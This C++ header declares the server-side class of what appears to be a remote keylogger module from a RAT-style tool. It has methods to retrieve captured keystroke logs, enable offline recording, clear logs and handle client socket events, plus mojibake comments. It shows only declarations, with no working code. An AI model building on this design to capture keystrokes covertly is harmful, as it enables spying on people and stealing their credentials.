#pragma once
#include "EventHandler.h"
#include "kblog_common.h"

//notify 
#define WM_KEYBD_LOG_DATA		(WM_USER + 123)
#define WM_KEYBD_LOG_ERROR		(WM_USER + 124)
#define WM_KEYBD_LOG_INIT		(WM_USER + 125)


class CKeybdLogSrv :
	public CEventHandler
{
public:
	CKeybdLogSrv(CClient*pClient);

	~CKeybdLogSrv();

	void GetLogData();
	void SetOfflineRecord(BOOL bOfflineRecord);
	void CleanLog();
private:
	 void OnGetPlug();

	 void OnLogData(char*szLog, BOOL Append);
	 void OnLogError(char*szError);
	 void OnLogInit(char*InitInfo);
	
	 void OnClose();					//��socket�Ͽ���ʱ������������
	 void OnOpen();				//��socket���ӵ�ʱ������������
	 
	 void OnEvent(UINT32 e, BYTE *lpData, UINT32 Size);;

};

